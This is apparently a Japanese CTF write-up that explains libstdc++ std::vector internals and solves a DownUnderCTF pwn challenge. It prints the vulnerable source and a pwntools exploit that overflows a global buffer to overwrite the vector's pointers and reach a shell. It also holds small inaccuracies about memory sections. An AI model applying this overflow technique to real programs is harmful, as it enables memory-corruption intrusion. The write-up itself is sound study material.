# C++,ベクトル型の実装仕様とMemory Allocation

今回は先日のDownUnderCTFで出たC++,Vector型のpwn問で知ったVector型の仕様,メモリアロケーションについてのブログです.

## 仕様
Vector型の仕様はとても単純です.

Vector型は可変長の配列として認識されているところがありますが,その実態は2\^nの領域をヒープ領域に確保し,足りない場合2\^(n+1)のメモリをヒープ領域にアロケーションしもとのデータをコピーし開放しているだけです.

この実装仕様はgcc,libstdc++のstl_vector.h([github](https://github.com/gcc-mirror/gcc/blob/master/libstdc++-v3/include/bits/stl_vector.h)もしくは/usr/include/c++/version/bits/stl_vector.h)で確認できます.

要素を末尾に追加するpush_back()はこのようになっています.
```C
void
push_back(const value_type& __x){
    if (this->_M_impl._M_finish != this->_M_impl._M_end_of_storage)
    {
  _GLIBCXX_ASAN_ANNOTATE_GROW(1);
  _Alloc_traits::construct(this->_M_impl, this->_M_impl._M_finish,__x);
  ++this->_M_impl._M_finish;
  _GLIBCXX_ASAN_ANNOTATE_GREW(1);
  }
  else
  _M_realloc_append(__x);
}
```

## コード内の_M_finishや_M_end_of_storageとは
コード内の_M_finish,_M_end_of_storage,_M_start(後述)はヒープ領域ではなく.bssセクションに記憶されるデータです.

* _M_start
  * このポインタはvector型がヒープ領域に確保している範囲の最初を指しています
* _M_finish
  * このポインタはvector型の最後の要素の次の要素の位置を指しています
* _M_end_of_storage
  * このポインタはvector型がヒープ領域に確保している範囲の終わりを指しています

> .bssセクションとはプログラムのグローバル変数等を記憶するセクションです.
> 
> 他のプログラムのセクションとしては定数を記憶する.dataセクションやstack,heapもセクションの一部です

vector型ではこの変数に確保した_M_startのみならず_M_finishを記憶することでの高速に要素を追加することが出来るようになっています.

ヒープに確保した領域が足りなくなった場合2倍の領域を確保し要素をコピーしなければならないのでこの操作にはo(n)の時間がかかりますがこの再確保の頻度は指数関数的に減少します.

## .bssのオーバーライト
7/6~7/7に開催された[Down Under CTF](https://downunderctf.com/)のpwn問題でこのような問題がありました.
```C++
#include <cstdlib>
#include <iostream>
#include <string>
#include <vector>

char buf[16];
std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};

void lose() {
    puts("Bye!");
    exit(1);
}

void win() {
    system("/bin/sh");
    exit(0);
}

int main() {
    char ductf[6] = "DUCTF";
    char* d = ductf;

    std::cin >> buf;
    if(v.size() == 5) {
        for(auto &c : v) {
            if(c != *d++) {
                lose();
            }
        }

        win();
    }

    lose();
}
```
vector型vの中身をDUCTFに書き換えればwin()をコールしシェルをゲット出来る問題です.
```C++
ctd::cin >> buf
```
この部分に自明なBOFがあり,bufはグローバルなので.bssセクションに確保されています.

![Screenshot_20240719_125717.png](vector_ninja.png)

よって

```C++
DUCTF+パディング+_M_start+_M_finish+_M_end_of_storage_

_M_start : bufの先頭
_M_finish : bufのインデックス5
_M_end_of_storage : bufのインデックス5
```

とすれば

```C++
for(auto &c : v) {
  if(c != *d++) {
    lose();
  }
}
```

は私の入力を参照しますから突破出来ます.

```Python
from pwn import *

p = process("vector_of")

p.sendline(b"DUCTF"+b"a"*11 + p64(0x4051e0) + p64(0x4051e5) + p64(0x4051e5))

p.interactive()
```

exploit自体はとても簡単でしたがvector型の仕様を完璧に理解することが出来ました.
チャレンジはPIE無効でしたがPIE有効でもアドレスリークさえできれば色々応用が効きそうですね.

